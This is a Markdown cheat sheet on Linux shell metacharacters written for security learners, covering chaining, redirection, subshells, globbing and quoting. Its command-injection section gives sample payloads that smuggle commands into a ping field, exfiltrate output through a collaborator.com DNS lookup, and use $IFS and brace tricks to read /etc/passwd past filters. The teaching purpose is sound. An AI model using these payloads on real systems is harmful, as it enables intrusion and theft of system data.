```bash

# 🐧 Linux Metacharacters Cheat Sheet

**"The glue that holds Linux commands together."**

Understanding these symbols is what separates a beginner from a power user. It is also the foundation of **Command Injection** attacks.

---

## 🔗 Command Chaining (Logic)
*How to run multiple commands at once.*

| Symbol | Name | Logic | Example |
| :--- | :--- | :--- | :--- |
| `;` | **Separator** | "Run A, then run B." (Doesn't care if A fails). | `cd /root ; ls` |
| `&&` | **AND** | "Run A. If A works, run B." | `mkdir test && cd test` |
| `||` | **OR** | "Run A. If A FAILS, run B." (Great for error handling). | `ping 10.10.10.10 || echo "Target Down"` |
| `&` | **Background** | "Run A in the background so I can keep typing." | `python3 server.py &` |
| `!` | **NOT** | Inverts the exit code (True becomes False). | `if ! grep "error" log.txt; then echo "Clean"; fi` |

---

## 🚰 Pipes & Redirection (Flow)
*Controlling where the data goes.*

| Symbol | Name | Action | Example |
| :--- | :--- | :--- | :--- |
| `|` | **Pipe** | Take the output of Left and feed it into Right. | `cat file.txt | grep "password"` |
| `>` | **Overwrite** | Save output to a file (Deletes old content!). | `nmap target > scan.txt` |
| `>>` | **Append** | Save output to a file (Adds to the end). | `echo "new line" >> notes.txt` |
| `<` | **Input** | Feed a file contents into a command. | `mysql -u root < database.sql` |
| `2>` | **Stderr** | Redirect only the Error messages. | `find / -name flag.txt 2> /dev/null` |
| `&>` | **All Out** | Redirect BOTH Output and Errors to a file. | `python script.py &> full_log.txt` |
| `<<<` | **Here-String** | Feed a string directly into stdin. | `base64 <<< "secret"` |

---

## 💉 Command Injection (The "Hacker" Context)
*Why do we care about these symbols in Cybersecurity?*

If a website lets me ping an IP (e.g., `ping 8.8.8.8`), I can try to inject these metacharacters to run my own code.

### The Classic Injection
`8.8.8.8; whoami`
*   **Result:** Runs ping, finishes, then runs `whoami`.

### The "Inline" Injection (Command Substitution)
This forces the shell to run the inner command **before** the outer command.
*   **Backticks:** `` `whoami` ``
*   **Dollar-Parens:** `$(whoami)`
*   **Example:** `ping $(whoami).collaborator.com` -> The server looks up `root.collaborator.com`.

### WAF Bypasses (Space Evasion)
If the web server blocks spaces, use these redirection hacks:
*   `cat<file.txt` (No space needed)
*   `cat$IFS/etc/passwd` (Using Internal Field Separator variable as a space)
*   `{cat,/etc/passwd}` (Brace expansion)

---

## 🏗️ Grouping & Subshells
*Advanced command organization.*

### `( )` Subshell
Runs commands in a *separate* shell environment. Variables set here die when the parentheses close.
```bash
(cd /tmp; ls) 
# I am back in my original folder after this runs. The 'cd' only happened inside the bubble.
```

{ } Command Block

Runs commands in the current shell.

```bash
{ echo "Start"; date; echo "End"; } > log.txt
### Groups all output into one stream before redirecting.
```
### 🎭 Wildcards (Globbing)

Lazy typing for the win.

* : Matches anything.

rm * -> Deletes everything.

? : Matches one character.

ls flag?.txt -> Matches flag1.txt, flagA.txt, but NOT flag10.txt.

[] : Matches a range.

ls [a-z]* -> Files starting with lowercase letters.

ls [!0-9]* -> Files NOT starting with a number.

### 🛡️ Escaping (Stopping the Magic)

If you want to use a symbol literally (not as a command).

Symbol	Name	Effect
\	Backslash	Escapes the next character. echo \$HOME prints $HOME.
' '	Single Quote	Strong Quote. Escapes EVERYTHING inside. echo '$HOME' prints $HOME.
" "	Double Quote	Weak Quote. Escapes spaces but allows variables. echo "$HOME" prints /home/user.